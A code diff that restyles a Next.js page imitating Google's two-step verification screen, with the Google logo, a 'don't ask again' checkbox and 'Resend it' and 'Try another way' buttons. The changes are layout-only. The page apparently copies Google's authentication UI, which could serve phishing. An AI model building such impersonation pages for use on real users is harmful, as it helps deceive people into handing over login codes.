@@ -5,7 +5,7 @@ import Image from "next/image";
 export default function Verification() {
   return (
     <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
-      <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[500px]">
+      <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[550px]">
         <div className="flex justify-center">
           <Image src="/images/google.png" alt="google" width={82} height={30} />
         </div>
@@ -36,11 +36,11 @@ export default function Verification() {
                 <input type="checkbox" />
                 <p className="ml-3">Don't ask again on this device</p>
               </div>
-              <div className=" flex flex-col pb-5">
-                <button className="text-sm text-[#1a73e8] cursor-pointer font-medium">
+              <div className=" flex flex-col mt-3 items-start ">
+                <button className="text-sm text-[#1a73e8] cursor-pointer font-medium pt-3">
                   Resend it
                 </button>
-                <button className="text-sm text-[#1a73e8] cursor-pointer font-semibold">
+                <button className="text-sm text-[#1a73e8] cursor-pointer font-semibold pt-3 pb-5">
                   Try another way
                 </button>
               </div>
